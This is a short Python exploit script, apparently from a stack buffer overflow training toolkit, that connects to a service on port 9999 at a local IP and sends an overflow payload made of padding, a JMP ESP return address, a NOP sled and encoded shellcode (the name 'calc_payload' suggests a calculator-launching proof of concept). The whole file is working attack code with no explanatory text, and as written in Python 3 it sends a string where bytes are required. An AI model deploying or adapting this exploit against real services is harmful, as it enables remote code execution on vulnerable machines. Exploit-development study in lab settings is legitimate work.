#!/usr/bin/python3
#_*_ coding: utf8 _*_

import socket

"""
Project repository: https://github.com/JoshuaProvoste/Stack-Buffer-Overflow-Python-Toolkit 
"""

buf =  ""
buf += "\xbe\x02\x5d\x99\x45\xdb\xcc\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x31\x83\xc0\x04\x31\x70\x0f\x03\x70\x0d\xbf"
buf += "\x6c\xb9\xf9\xbd\x8f\x42\xf9\xa1\x06\xa7\xc8\xe1\x7d"
buf += "\xa3\x7a\xd2\xf6\xe1\x76\x99\x5b\x12\x0d\xef\x73\x15"
buf += "\xa6\x5a\xa2\x18\x37\xf6\x96\x3b\xbb\x05\xcb\x9b\x82"
buf += "\xc5\x1e\xdd\xc3\x38\xd2\x8f\x9c\x37\x41\x20\xa9\x02"
buf += "\x5a\xcb\xe1\x83\xda\x28\xb1\xa2\xcb\xfe\xca\xfc\xcb"
buf += "\x01\x1f\x75\x42\x1a\x7c\xb0\x1c\x91\xb6\x4e\x9f\x73"
buf += "\x87\xaf\x0c\xba\x28\x42\x4c\xfa\x8e\xbd\x3b\xf2\xed"
buf += "\x40\x3c\xc1\x8c\x9e\xc9\xd2\x36\x54\x69\x3f\xc7\xb9"
buf += "\xec\xb4\xcb\x76\x7a\x92\xcf\x89\xaf\xa8\xeb\x02\x4e"
buf += "\x7f\x7a\x50\x75\x5b\x27\x02\x14\xfa\x8d\xe5\x29\x1c"
buf += "\x6e\x59\x8c\x56\x82\x8e\xbd\x34\xc8\x51\x33\x43\xbe"
buf += "\x52\x4b\x4c\xee\x3a\x7a\xc7\x61\x3c\x83\x02\xc6\xa2"
buf += "\x61\x87\x32\x4b\x3c\x42\xff\x16\xbf\xb8\xc3\x2e\x3c"
buf += "\x49\xbb\xd4\x5c\x38\xbe\x91\xda\xd0\xb2\x8a\x8e\xd6"
buf += "\x61\xaa\x9a\xb4\xe4\x38\x46\x15\x83\xb8\xed\x69"

xp = "192.168.0.7"
port = 9999

A = "\x41" * 524
jmp_esp = "\xF3\x12\x17\x31"
nops = "\x90" * 20

calc_payload = A + jmp_esp + nops + buf

try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((xp,port))
	sock.recv(1024)			
	sock.send(calc_payload)
except ConnectionRefusedError:
    print("Connection error. Review the IP address or port.")
    exit()
except socket.timeout:
    sock.close()
    print("\nConnection error. Timeout!")
except socket.error:
    sock.close()
    pass
except KeyboardInterrupt:
    sock.close()
    print("\n\nConnection closed. Bye!")
    exit()